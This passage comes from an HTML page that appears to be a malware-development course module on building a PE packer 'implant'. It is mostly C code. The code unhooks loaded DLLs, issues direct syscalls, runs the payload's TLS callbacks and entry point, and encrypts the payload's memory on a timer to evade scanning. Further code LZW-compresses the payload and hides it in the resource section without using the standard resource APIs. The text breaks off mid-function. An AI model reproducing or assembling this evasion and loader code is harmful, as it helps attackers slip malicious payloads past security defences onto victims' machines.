	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pVectoredExptnHandler <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pAddVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">,</span> UnhookingVectoredExceptionHandler<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// Unhooking loaded dlls</span>
	<span class="token function">UnhookAllLoadedDlls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Removing the set VEH</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_WinAPI<span class="token punctuation">.</span><span class="token function">pRemoveVectoredExceptionHandler</span><span class="token punctuation">(</span>pVectoredExptnHandler<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Resolve the PE's exception handlers if found</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pEntryExceptionDataDir<span class="token operator">-&gt;</span>Size<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RUNTIME_FUNCTION_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pPeHdrs<span class="token operator">-&gt;</span>pEntryExceptionDataDir<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_WinAPI<span class="token punctuation">.</span><span class="token function">pRtlAddFunctionTable</span><span class="token punctuation">(</span>pImgRuntimeFuncEntry<span class="token punctuation">,</span> <span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pEntryExceptionDataDir<span class="token operator">-&gt;</span>Size <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_RUNTIME_FUNCTION_ENTRY<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> pPeBaseAddress<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Set up a VEH that will run PeFluctuationVectoredExceptionHandler when an exception occurs while executing the PE</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pVectoredExptnHandler <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pAddVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">,</span> PeFluctuationVectoredExceptionHandler<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token comment">// Flush instructions</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtFlushInstructionCache<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Execute TLS callbacks if found</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pEntryTLSDataDir<span class="token operator">-&gt;</span>Size<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		PIMAGE_TLS_DIRECTORY		pImgTlsDirectory	<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_TLS_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pPeHdrs<span class="token operator">-&gt;</span>pEntryTLSDataDir<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
		PIMAGE_TLS_CALLBACK<span class="token operator">*</span>		pImgTlsCallback		<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_TLS_CALLBACK<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pImgTlsDirectory<span class="token operator">-&gt;</span>AddressOfCallBacks<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> <span class="token operator">*</span>pImgTlsCallback<span class="token punctuation">;</span> pImgTlsCallback<span class="token operator">++</span><span class="token punctuation">)</span>
			<span class="token punctuation">(</span><span class="token operator">*</span>pImgTlsCallback<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>pPeBaseAddress<span class="token punctuation">,</span> DLL_PROCESS_ATTACH<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Free 'pPeHdrs-&gt;pFileBuffer', which is the base address of the decompressed PE</span>
	<span class="token function">LocalFree</span><span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pFileBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Create a timer queue</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>g_hTimerQueue <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pCreateTimerQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Use the timer queue created to execute the 'ObfuscationTimerCallback' callback function after 'EXEC_WAIT' seconds to encrypt memory at 'g_uPeTextAddress'</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_WinAPI<span class="token punctuation">.</span><span class="token function">pCreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_hTimer<span class="token punctuation">,</span> g_hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ObfuscationTimerCallback<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> EXEC_WAIT <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Execute the EP</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>bIsDLLFile <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pDllMain <span class="token operator">=</span> <span class="token punctuation">(</span>DLLMAIN<span class="token punctuation">)</span>pEntryPoint<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">pDllMain</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HINSTANCE<span class="token punctuation">)</span>pPeBaseAddress<span class="token punctuation">,</span> DLL_PROCESS_ATTACH<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pMain <span class="token operator">=</span> <span class="token punctuation">(</span>MAIN<span class="token punctuation">)</span>pEntryPoint<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">pMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-18">LZW Data Compression Algorithm</h3>
<p>To pack the PE payload within our implant, one can utilize any C <a href="https://en.wikipedia.org/wiki/Data_compression" target="_blank">data compression</a> implementation that is compatible with the Visual Studio compiler. For this implementation, the <a href="https://www.geeksforgeeks.org/lzw-lempel-ziv-welch-compression-technique/" target="_blank">LZW algorithm</a>
 will be used. Covering how the LZW algorithm works is out of the scope 
of this module, however, implementing the algorithm through the use of 
open-source code is discussed in the sections below.</p>
<h3 id="toc-heading-19">The Lzw-Eddy Repository</h3>
<p>Upon searching for a functional LZW implementation, the <a href="https://github.com/eloj/lzw-eddy" target="_blank">lzw-eddy</a>
 repository was found to be a bug-free project, in addition to being 
compatible with the Visual Studio compiler. The LZW compression 
algorithm was implemented in the <a href="https://github.com/eloj/lzw-eddy/blob/master/lzw.h" target="_blank">lzw.h</a> header file of the repository, where the functions <code>lzw_compress</code> and <code>lzw_decompress</code>
 are called to compress and decompress data respectively. Both of these 
functions accept 5 parameters and require prior initialization to these 
parameters. To make matters simpler, two new wrapper functions will be 
created <code>LzwCompressData</code> and <code>LzwDecompressData</code>.</p>
<h4 id="toc-heading-20">LzwCompressData Function</h4>
<p>The <code>LzwCompressData</code> function below uses <code>lzw_compress</code> after initializing its parameters to compressed input data. <code>LzwCompressData</code> returns <code>TRUE</code> if it succeeds in compressing the data. The function also accepts the following parameters:</p>
<ul>
<li>
<p><code>pRawData</code> - The base address of the plaintext data to compress.</p>
</li>
<li>
<p><code>sRawDataSize</code> - The size of the plaintext data to compress.</p>
</li>
<li>
<p><code>ppCompressedData</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the compressed data.</p>
</li>
<li>
<p><code>psCompressedDataSize</code> - A pointer to a <code>SIZE_T</code> variable that will receive the size of the compressed data.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">LzwCompressData</span><span class="token punctuation">(</span>IN PBYTE pRawData<span class="token punctuation">,</span> IN SIZE_T sRawDataSize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> ppCompressedData<span class="token punctuation">,</span> OUT PSIZE_T psCompressedDataSize<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
	<span class="token keyword">struct</span>		<span class="token class-name">lzw_state</span><span class="token operator">*</span>	pLzwState		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SSIZE_T				    ssResults		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span> 
					        ssWritten		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PBYTE				    pCompressed		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T				    sAllocated		<span class="token operator">=</span> sRawDataSize<span class="token punctuation">;</span>

	<span class="token comment">// Initializing lzw_compress's parameter</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pLzwState <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">lzw_state</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">lzw_state</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// Allocating memory for the compressed data</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pCompressed <span class="token operator">=</span> <span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> sAllocated<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// Compressing the data using the 'lzw_compress' function </span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ssResults <span class="token operator">=</span> <span class="token function">lzw_compress</span><span class="token punctuation">(</span>pLzwState<span class="token punctuation">,</span> pRawData<span class="token punctuation">,</span> sRawDataSize<span class="token punctuation">,</span> pCompressed<span class="token punctuation">,</span> sAllocated<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>ssWritten <span class="token operator">&gt;</span> sRawDataSize<span class="token punctuation">)</span> 
			<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
		ssWritten <span class="token operator">+=</span> ssResults<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Checking the return value</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ssResults <span class="token operator">&lt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span> 
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// Assigning the output parameters values</span>
	<span class="token operator">*</span>ppCompressedData	    <span class="token operator">=</span> pCompressed<span class="token punctuation">;</span>
	<span class="token operator">*</span>psCompressedDataSize	<span class="token operator">=</span> ssWritten<span class="token punctuation">;</span>

_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pLzwState<span class="token punctuation">)</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span>pLzwState<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ssResults <span class="token operator">&lt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span>pCompressed<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppCompressedData <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>psCompressedDataSize<span class="token punctuation">)</span> <span class="token operator">?</span> TRUE <span class="token operator">:</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-21">LzwDecompressData Function</h4>
<p>On the other hand, the <code>LzwDecompressData</code> function below uses <code>lzw_decompress</code> after initializing its parameters to decompress LZW compressed data. <code>LzwDecompressData</code> returns <code>TRUE</code> if it succeeds in decompressing the data. The function also accepts the following parameters:</p>
<ul>
<li>
<p><code>pCompressedData</code> - The base address of the LZW compressed data to decompress.</p>
</li>
<li>
<p><code>sCompressedDataSize</code> - The size of the compressed data.</p>
</li>
<li>
<p><code>ppRawData</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the decompressed data.</p>
</li>
<li>
<p><code>psRawDataSize</code> - A pointer to a <code>SIZE_T</code> 
variable that will receive the size of the decompressed data. This 
parameter should be set to the original size of the data before 
compressing (<code>sRawDataSize</code> in <code>LzwCompressData</code>). Therefore, the <code>psRawDataSize</code> parameter should have the same value before and after the function execution.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">LzwDecompressData</span><span class="token punctuation">(</span>IN PBYTE pCompressedData<span class="token punctuation">,</span> IN SIZE_T sCompressedDataSize<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> ppRawData<span class="token punctuation">,</span> IN OUT PSIZE_T psRawDataSize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">struct</span>		<span class="token class-name">lzw_state</span><span class="token operator">*</span>	pLzwState		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SSIZE_T				    ssResults		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span> 
					        ssWritten		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PBYTE				    pRawData		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T				    sAllocated		<span class="token operator">=</span> <span class="token operator">*</span>psRawDataSize<span class="token punctuation">;</span>		 

	<span class="token comment">// Initializing lzw_decompress's parameter</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pLzwState <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">lzw_state</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">lzw_state</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// Allocating memory for the decompressed data</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pRawData <span class="token operator">=</span> <span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> sAllocated<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>

	<span class="token comment">// Decompressing the data using the 'lzw_decompress' function </span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ssResults <span class="token operator">=</span> <span class="token function">lzw_decompress</span><span class="token punctuation">(</span>pLzwState<span class="token punctuation">,</span> pCompressedData<span class="token punctuation">,</span> sCompressedDataSize<span class="token punctuation">,</span> pRawData<span class="token punctuation">,</span> sAllocated<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>ssWritten <span class="token operator">&gt;</span> <span class="token operator">*</span>psRawDataSize<span class="token punctuation">)</span> 
			<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
		ssWritten <span class="token operator">+=</span> ssResults<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Checking the return value</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ssResults <span class="token operator">&lt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span> 
		<span class="token keyword">goto</span> _FUNC_CLEANUP<span class="token punctuation">;</span>
	
	<span class="token comment">// Assigning the output parameters values</span>
	<span class="token operator">*</span>ppRawData	    <span class="token operator">=</span> pRawData<span class="token punctuation">;</span>
	<span class="token operator">*</span>psRawDataSize	<span class="token operator">=</span> ssWritten<span class="token punctuation">;</span>

_FUNC_CLEANUP<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pLzwState<span class="token punctuation">)</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span>pLzwState<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ssResults <span class="token operator">&lt;</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span>pRawData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppRawData <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>psRawDataSize<span class="token punctuation">)</span> <span class="token operator">?</span> TRUE <span class="token operator">:</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-22">PeCompressor Program</h3>
<p>To pack the PE payload, the <code>PeCompressor.exe</code> program has been constructed. <code>PeCompressor.exe</code> will make use of the <code>LzwCompressData</code> function after reading a PE payload from the disk, then write the compressed data into a file named <code>PeFileCompressed.lzw</code>. This new file will be a part of the PE packer's implant where it will read it from its resource section.</p>
<p>It is worth noting that since the <code>LzwDecompressData</code> function requires the original size of the payload (before being compressed), the <code>PeCompressor.exe</code> program will write the initial payload size at the end of the <code>PeFileCompressed.lzw</code> file, which allows the PE packer to retrieve that value at runtime, and invoke the <code>LzwDecompressData</code> function with the right parameters. This trick is shown in the image below.</p>
<img width="800px" style="margin:auto" alt="image" src="31_files/pepacker-276522384-6958be7a-e87b-43a0-81a6-799f48e1fe5f.png">
<h3 id="toc-heading-23">Payload Placement</h3>
<p>As mentioned earlier, the PE packer will store the compressed version of the PE payload, <code>PeFileCompressed.lzw</code>,
 in its resource section. Storing a payload in the resource section of 
the implant was done multiple times across the course but was first 
implemented in the <em>Payload Placement - .rsrc Section</em> module.</p>
<h3 id="toc-heading-24">The GetDecompressedResourcePayload Function</h3>
<p>From the PE packer's perspective, to retrieve the PE payload in its plaintext version, the implant must undergo the steps below.</p>
<ol>
<li>
<p>Fetch the compressed payload from the resource section.</p>
</li>
<li>
<p>Retrieve the original size of the payload saved as the last 8 bytes at the end of the resource section.</p>
</li>
<li>
<p>Call the <code>LzwDecompressData</code> function to decompress the retrieved data.</p>
</li>
</ol>
<p>These steps are performed by the <code>GetDecompressedResourcePayload</code> function shown below which requires the following parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the module from which the resource section payload should be retrieved.</p>
</li>
<li>
<p><code>wResourceId</code> - The resource ID associated with the payload, which was assigned during the creation of the resource section.</p>
</li>
<li>
<p><code>ppDecompressedPe</code> - A pointer to a <code>PBYTE</code> variable that will be set as the base address of the decompressed PE payload.</p>
</li>
<li>
<p><code>psDecompressedPeSize</code> - A pointer to a <code>SIZE</code> variable that will be set as the size of the decompressed PE payload.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetDecompressedResourcePayload</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN WORD wResourceId<span class="token punctuation">,</span> OUT PBYTE<span class="token operator">*</span> ppDecompressedPe<span class="token punctuation">,</span> OUT PSIZE_T psDecompressedPeSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PBYTE		pCompressedPe		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T		sCompressedPeSize	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// Fetching packed PE from .rsrc section</span>
	<span class="token comment">// Helper function - explained in the next section</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetResourceData</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> wResourceId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pCompressedPe<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sCompressedPeSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Retrieving the size of the raw PE</span>
	<span class="token operator">*</span>psDecompressedPeSize <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PSIZE_T<span class="token punctuation">)</span><span class="token punctuation">(</span>pCompressedPe <span class="token operator">+</span> sCompressedPeSize <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">*</span>ppDecompressedPe <span class="token operator">=</span> <span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token operator">*</span>psDecompressedPeSize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">LzwDecompressData</span><span class="token punctuation">(</span>pCompressedPe<span class="token punctuation">,</span> sCompressedPeSize<span class="token punctuation">,</span> ppDecompressedPe<span class="token punctuation">,</span> psDecompressedPeSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">LocalFree</span><span class="token punctuation">(</span><span class="token operator">*</span>ppDecompressedPe<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-25">GetResourceData Helper Function</h4>
<p><code>GetDecompressedResourcePayload</code> makes use of a helper function, <code>GetResourceData</code>, which was used in earlier modules to retrieve data from the resource section without the need to call any of the <code>FindResource</code>, <code>LoadResource</code>, <code>LockResource</code>, or <code>SizeofResource</code> WinAPIs.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetResourceData</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN WORD ResourceId<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> ppResourceRawData<span class="token punctuation">,</span> OUT PDWORD psResourceDataSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	CHAR<span class="token operator">*</span>                   pBaseAddr          <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>
	PIMAGE_DOS_HEADER       pImgDosHdr         <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBaseAddr<span class="token punctuation">;</span>
	PIMAGE_NT_HEADERS       pImgNTHdr          <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pImgDosHdr<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PIMAGE_OPTIONAL_HEADER  pImgOptionalHdr    <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER<span class="token punctuation">)</span><span class="token operator">&amp;</span>pImgNTHdr<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">;</span>
	PIMAGE_DATA_DIRECTORY   pDataDir           <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token operator">&amp;</span>pImgOptionalHdr<span class="token operator">-&gt;</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_RESOURCE<span class="token punctuation">]</span><span class="token punctuation">;</span>

	PIMAGE_RESOURCE_DIRECTORY               pResourceDir    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceDir2    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceDir3   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_RESOURCE_DIRECTORY_ENTRY         pResourceEntry  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceEntry2  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> pResourceEntry3 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_RESOURCE_DATA_ENTRY              pResource	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


	pResourceDir	<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pResourceEntry	<span class="token operator">=</span> <span class="token punctuation">(</span>IMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

